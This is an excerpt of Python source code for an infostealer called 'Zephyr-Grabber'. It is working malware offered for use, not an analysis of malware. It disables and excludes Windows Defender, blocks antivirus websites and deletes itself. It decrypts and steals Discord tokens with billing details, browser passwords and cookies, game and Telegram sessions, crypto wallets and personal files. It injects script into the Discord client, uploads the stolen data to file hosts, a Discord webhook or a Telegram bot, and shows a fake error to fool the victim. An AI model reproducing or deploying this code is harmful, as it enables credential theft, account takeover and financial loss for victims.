...
Logger = logging.getLogger("Zephyr-Grabber")
...
class Syscalls:
    ...
    def CryptUnprotectData(encrypted_data: bytes,
                           optional_entropy: str = None) -> bytes:  # Calls the CryptUnprotectData function from crypt32.dll
        ...
        if optional_entropy is not None:
            ...
            pOptionalEntropy = DATA_BLOB(len(optional_entropy),
                                         ctypes.cast(optional_entropy, ctypes.POINTER(ctypes.c_ubyte)))

        if ctypes.windll.Crypt32.CryptUnprotectData(ctypes.byref(pDataIn), None, ctypes.byref(
                pOptionalEntropy) if pOptionalEntropy is not None else None, None, None, 0, ctypes.byref(pDataOut)):
...
class Utility:
    ...
    def DisableDefender() -> None:  # Tries to disable the defender
        command = base64.b64decode(
            b'').decode(
            errors="ignore")  # Encoded because it triggers antivirus and it can delete the file
    ...
    def ExcludeFromDefender(path: str = None) -> None:  # Tries to exclude a file or folder from defender's scan
        ...
        subprocess.Popen("powershell -Command Add-MpPreference -ExclusionPath '{}'".format(path), shell=True,
    ...
    def GetLnkTarget(path_to_lnk: str) -> str | None:  # Finds the target of the given shortcut file
        ...
        if os.path.isfile(path_to_lnk):
            output = subprocess.run(
                'wmic path win32_shortcutfile where name="%s" get target /value' % os.path.abspath(path_to_lnk).replace(
            ...
            match method:
                case 1:
                    ...
                    log_count_before = len(
                        execute('wevtutil qe "Microsoft-Windows-Windows Defender/Operational" /f:text').stdout)
    ...
    def DeleteSelf():  # Deletes the current file
        ...
        if isExecutable:
            subprocess.Popen('ping localhost -n 3 > NUL && del /A H /F "{}"'.format(path), shell=True,
                             creationflags=subprocess.CREATE_NEW_CONSOLE | subprocess.SW_HIDE)
            os._exit(0)
        else:
            os.remove(path)
    ...
    def BlockSites() -> None:  # Tries to block AV related sites using hosts file
        if Utility.IsAdmin():
            ...
            BANNED_SITES = (
                ...
                "home.sophos.com", "adaware.com", "bullguard.com", "clamav.net", "drweb.com", "emsisoft.com",
...
class Discord:
    ...
    def GetTokens() -> list[dict]:  # Gets tokens from Discord clients and browsers
        ...
        for token in tokens:
            r: HTTPResponse = Discord.httpClient.request("GET", "https://discord.com/api/v9/users/@me",
                                                         headers=Discord.GetHeaders(token.strip()))
            if r.status == 200:
                ...
                billing = json.loads(
                    Discord.httpClient.request('GET', 'https://discordapp.com/api/v9/users/@me/billing/payment-sources',
                ...
                if len(billing) == 0:
                    ...
                    billing = ', '.join(['{} ({})'.format(name, quantity) for name, quantity in methods.items() if
                                         quantity != 0]) or 'None'
                gifts = list()
    ...
    def SafeStorageSteal(path: str) -> list[str]:  # Searches for tokens in the Discord client's storage directory
        ...
        for token in encryptedTokens:
            try:
                token = pyaes.AESModeOfOperationGCM(Syscalls.CryptUnprotectData(key), token[3:15]).decrypt(token[15:])[
                        :-16].decode(errors="ignore")
                if token:
                    tokens.append(token)
            except Exception:
                pass
    ...
    def InjectJs() -> str | None:  # Injects javascript into the Discord client's file
        check = False
        try:
            code = base64.b64decode(b"%injectionbase64encoded%").decode(errors="ignore").replace(
                "'%WEBHOOKHEREBASE64ENCODED%'",
                "'{}'".format(base64.b64encode(Settings.C2[1].encode()).decode(errors="ignore")))
        except Exception:
            return None
...
class ZephyrGrabber:
    ...
    def __init__(self) -> None:  # Constructor to call all the functions
        self.Separator = "\n\n" + "Zephyr-Grabber".center(50, "=") + "\n\n"  # Sets the value of the separator

        while True:
            self.ArchivePath = os.path.join(os.getenv("temp"),
                                            Utility.GetRandomString() + ".zip")  # Sets the archive path
        ...
        if Errors.errors:  # If there were any errors during the process, then save the error messages into a file
            with open(os.path.join(self.TempFolder, "Errors.txt"), "w", encoding="utf-8", errors="ignore") as file:
                file.write(
                    "# This file contains the errors handled successfully during the functioning of the stealer." + "\n\n" + "=" * 50 + "\n\n" + (
                            "\n\n" + "=" * 50 + "\n\n").join(Errors.errors))
                    ...
                    for file in os.listdir(dir):
                        if os.path.isfile(os.path.join(dir, file)):
                            if (any([x in file.lower() for x in
                                     ("secret", "password", "account", "tax", "key", "wallet", "backup")]) \
                                or file.endswith((".txt", ".doc", ".docx", ".png", ".pdf", ".jpg", ".jpeg", ".csv",
                                                  ".mp3", ".mp4", ".xls", ".xlsx"))) \
                                    and os.path.getsize(
                                os.path.join(dir, file)) < 2 * 1024 * 1024:  # File less than 2 MB
                                try:
                                    os.makedirs(os.path.join(self.TempFolder, "Common Files", name), exist_ok=True)
                                    shutil.copy(os.path.join(dir, file),
                                                os.path.join(self.TempFolder, "Common Files", name, file))
    ...
    def StealGrowtopia(self) -> None:  # Steals Growtopia session files
        if Settings.CaptureGames:
            ...
            growtopiadirs = [*set(
                [os.path.dirname(x) for x in [Utility.GetLnkTarget(v) for v in Utility.GetLnkFromStartMenu("Growtopia")]
                 if x is not None])]
    ...
    def StealSteam(self) -> None:  # Steals Steam accounts
        if Settings.CaptureGames:
            ...
            steamPaths = [*set(
                [os.path.dirname(x) for x in [Utility.GetLnkTarget(v) for v in Utility.GetLnkFromStartMenu("Steam")] if
                 x is not None])]
                        ...
                        if '"RememberPassword"\t\t"1"' in contents:
                            try:
                                ...
                                if multiple:
                                    _saveToPath = os.path.join(saveToPath, "Profile %d" % (index + 1))
                                os.makedirs(_saveToPath, exist_ok=True)
                                shutil.copytree(steamConfigPath, os.path.join(_saveToPath, "config"),
                                                dirs_exist_ok=True)
        ...
        if Settings.CaptureGames:
            ...
            for item in ('HKCU', 'HKLM'):
                process = subprocess.run(
                    "powershell Get-ItemPropertyValue -Path {}:SOFTWARE\\Roblox\\RobloxStudioBrowser\\roblox.com -Name .ROBLOSECURITY".format(
                        item), capture_output=True, shell=True)
    ...
    def StealWallets(self) -> None:  # Steals crypto wallets
        if Settings.CaptureWallets:
            ...
            wallets = (
                ...
                ("Jaxx",
                 os.path.join(os.getenv("appdata"), "com.liberty.jaxx", "IndexedDB", "file_0.indexeddb.leveldb")),
                ...
                if os.path.isdir(dir):
                    ...
                    if dircontent:
                        ...
                        if process.returncode == 0:
                            output[name] = (name + "\n" + "\n".join(
                                process.stdout.decode(errors="ignore").splitlines()[3:])).replace("|   ", PIPE).replace(
                                "+---", TEE).replace("\---", ELBOW)

            for key, value in output.items():
                os.makedirs(os.path.join(self.TempFolder, "Directories"), exist_ok=True)
                with open(os.path.join(self.TempFolder, "Directories", "{}.txt".format(key)), "w",
    ...
    def TakeScreenshot(self) -> None:  # Takes screenshot(s) of all the monitors of the system
        if Settings.CaptureScreenshot:
            ...
            if subprocess.run(
                    ["powershell.exe", "-NoProfile", "-ExecutionPolicy", "Bypass", "-EncodedCommand", command],
                    shell=True, capture_output=True, cwd=self.TempFolder).returncode == 0:
                self.ScreenshotTaken = True

    @Errors.Catch
    def BlockSites(
            self) -> None:  # Initiates blocking of AV related sites and kill any browser instance for them to reload the hosts file
    ...
    def StealBrowserData(self) -> None:  # Steal cookies, passwords and history from the browsers
        if not any((Settings.CaptureCookies, Settings.CapturePasswords,
                    Settings.CaptureHistory or Settings.CaptureAutofills)):
            return
                        ...
                        if passwords or cookies or history or autofills:
                            ...
                            if cookies:
                                output = ["{}\t{}\t{}\t{}\t{}\t{}\t{}".format(host, str(expiry != 0).upper(), cpath,
                                                                              str(not host.startswith(".")).upper(),
                                                                              expiry, cname, cookie) for
                                          host, cname, cpath, cookie, expiry in cookies]
                                with open(os.path.join(saveToDir, "{} Cookies.txt".format(name)), "w", errors="ignore",
                                          encoding="utf-8") as file:
                                    file.write("\n".join(output))
                            ...
                            if history:
                                ...
                                with open(os.path.join(saveToDir, "{} History.txt".format(name)), "w", errors="ignore",
                                          encoding="utf-8") as file:
                                    file.write(self.Separator.lstrip() + self.Separator.join(output))
                            ...
                            if autofills:
                                output = "\n".join(autofills)
                                with open(os.path.join(saveToDir, "{} Autofills.txt".format(name)), "w",
                                          errors="ignore", encoding="utf-8") as file:
                                    file.write(output)
    ...
    def StealTelegramSessions(self) -> None:  # Steals telegram session(s) files
        if Settings.CaptureTelegram:
            ...
            telegramPaths = [*set(
                [os.path.dirname(x) for x in [Utility.GetLnkTarget(v) for v in Utility.GetLnkFromStartMenu("Telegram")]
                 if x is not None])]
                    ...
                    for loginPath in loginPaths:
                        try:
                            if os.path.isfile(loginPath):
                                ...
                                shutil.copytree(loginPath, os.path.join(_saveToDir, os.path.basename(loginPath)),
                                                dirs_exist_ok=True)
                        except Exception:
                            shutil.rmtree(_saveToDir)
                            failed = True
        ...
        if Settings.CaptureDiscordTokens:
            ...
            if accounts:
                for item in accounts:
                    ...
                    output.append(
                        "Username: {}\nUser ID: {}\nMFA enabled: {}\nEmail: {}\nPhone: {}\nVerified: {}\nNitro: {}\nBilling Method(s): {}\n\nToken: {}\n\n{}".format(
                            USERNAME, USERID, 'Yes' if MFA else 'No', EMAIL, PHONE, 'Yes' if VERIFIED else 'No', NITRO,
                            BILLING, TOKEN, GIFTS).strip())

                os.makedirs(os.path.join(self.TempFolder, "Messenger", "Discord"), exist_ok=True)
                with open(os.path.join(saveToDir, "Discord Tokens.txt"), "w", encoding="utf-8",
    ...
    def CreateArchive(self) -> tuple[str, str]:  # Create archive of the data collected
        ...
        if Utility.GetSelf()[1] or os.path.isfile(rarPath):
            ...
            if os.path.isfile(rarPath):
                password = Settings.ArchivePassword or "dark123"
                process = subprocess.run('{} a -r -hp"{}" "{}" *'.format(rarPath, password, self.ArchivePath),
                                         capture_output=True, shell=True, cwd=self.TempFolder)
                if process.returncode == 0:
                    return "rar"

        shutil.make_archive(self.ArchivePath.rsplit(".", 1)[0], "zip",
                            self.TempFolder)  # Creates simple unprotected zip file if the above process fails
        return "zip"
    ...
    def UploadToExternalService(self, path, filename=None) -> str | None:  # Uploads a file to external service
        if os.path.isfile(path):
            ...
            try:
                server = \
                    json.loads(http.request("GET", "https://api.gofile.io/getServer").data.decode(errors="ignore"))[
                        "data"][
                        "server"]
                if server:
                    url = json.loads(http.request("POST", "https://{}.gofile.io/uploadFile".format(server),
                                                  fields={"file": (filename, fileBytes)}).data.decode(errors="ignore"))[
                        "data"]["downloadPage"]
                    if url:
                        return url
            except Exception:
                try:
                    ...
                    url = json.loads(http.request("POST", "https://api.anonfiles.com/upload",
                                                  fields={"file": (filename, fileBytes)}).data.decode(errors="ignore"))[
                        "data"]["file"]["url"]["short"]
                    return url
                except Exception:
    ...
    def SendData(self) -> None:  # Sends data to the webhook
        ...
        filename = "Zephyr-%s.%s" % (os.getlogin(), extention)
        ...
        system_info = f"[Pc] Name: {computerName}\n[Pc] OS: {computerOS}\nTotal Memory: {totalMemory}\nUUID: {uuid}\n[Pc] CPU: {cpu}\n[Pc] GPU: {gpu}\n[Windows] Product Key: {productKey}"

        collection = {
            "System Info": "Yes" if self.SystemInfoStolen else "No",
            "Discord Tokens": self.DiscordTokensCount,
            "Roblox Tokens": self.RobloxCookiesCount,
        ...
        match Settings.C2[0]:
            case 0:  # Discord Webhook
                image_url = "https://cdn.discordapp.com/attachments/1164559111879393342/1170816488752545887/icon.jpg?ex=655a6ad3&is=6547f5d3&hm=7b0f8969f3590742aa3a87755b0fbfeb77693d0eacdd6e6b26a2b5c7c9ee67f9&"

                payload = {
                    "content": "||@everyone||" if Settings.PingMe else "",
                    "embeds": [
                        {
                            "title": "Zephyr-Grabber Got A Hit :smiling_imp:",
                            "description": f"**[System] Infos\n```autohotkey\n{system_info}```\n[IP] Info```prolog\n{ipinfo}```\n[Other] Info```js\n{grabbedInfo}```**",
                            "url": "https://bio.link/grabber",
                            "color": 34303,
                            "footer": {
                                "text": "Grabbed by Zephyr-Grabber | CxOnTop"
                            },
                            "thumbnail": {
                                "url": image_url
                            }
            ...
            case 1:  # Telegram Bot
                payload = {
                    'caption': f'<b>Zephyr-Grabber</b> got a new victim: <b>{os.getlogin()}</b>\n\n<b>IP Info</b>\n<code>{ipinfo}</code>\n\n<b>System Info</b>\n<code>{system_info}</code>\n\n<b>Grabbed Info</b>\n<code>{grabbedInfo}</code>'.strip(),
                    'parse_mode': 'HTML'
                }
...
if __name__ == "__main__" and os.name == "nt":
    ...
    if Utility.GetSelf()[1] and (Settings.RunBoundOnStartup or not Utility.IsInStartup()) and os.path.isfile(
            boundFileSrc := os.path.join(sys._MEIPASS, "bound.blank")):
        try:
            Logger.info("Trying to extract bound file")
            if os.path.isfile(boundFileDst := os.path.join(os.getenv("temp"),
                                                           "bound.exe")):  # Checks if any bound file exists (only for exe mode)
            ...
            subprocess.Popen("start bound.exe", shell=True, cwd=os.path.dirname(boundFileDst),
                             creationflags=subprocess.CREATE_NEW_CONSOLE | subprocess.SW_HIDE)  # Starts the bound file
        except Exception as e:
            Logger.error(e)

    if Utility.GetSelf()[1] and Settings.FakeError[
        0] and not Utility.IsInStartup():  # If not in startup, check if fake error is defined (exe mode)
        try:
            Logger.info("Showing fake error popup")
            title = Settings.FakeError[1][0].replace("\x22", "\\x22").replace("\x27",
                                                                              "\\x22")  # Sets the title of the fake error
            message = Settings.FakeError[1][1].replace("\x22", "\\x22").replace("\x27",
                                                                                "\\x22")  # Sets the message of the fake error
            ...
            cmd = '''mshta "javascript:var sh=new ActiveXObject('WScript.Shell'); sh.Popup('{}', 0, '{}', {}+16);close()"'''.format(
                message, title, Settings.FakeError[1][2])  # Shows a message box using JScript
            subprocess.Popen(cmd, shell=True,
                             creationflags=subprocess.CREATE_NEW_CONSOLE | subprocess.SW_HIDE)  # Shows the fake error
        except Exception as e:
            Logger.error(e)
        ...
        while True:
            try:
                ...
                if Utility.IsConnectedToInternet():  # Check if internet connection is available
                    ...
                    ZephyrGrabber()  # Start the grabber
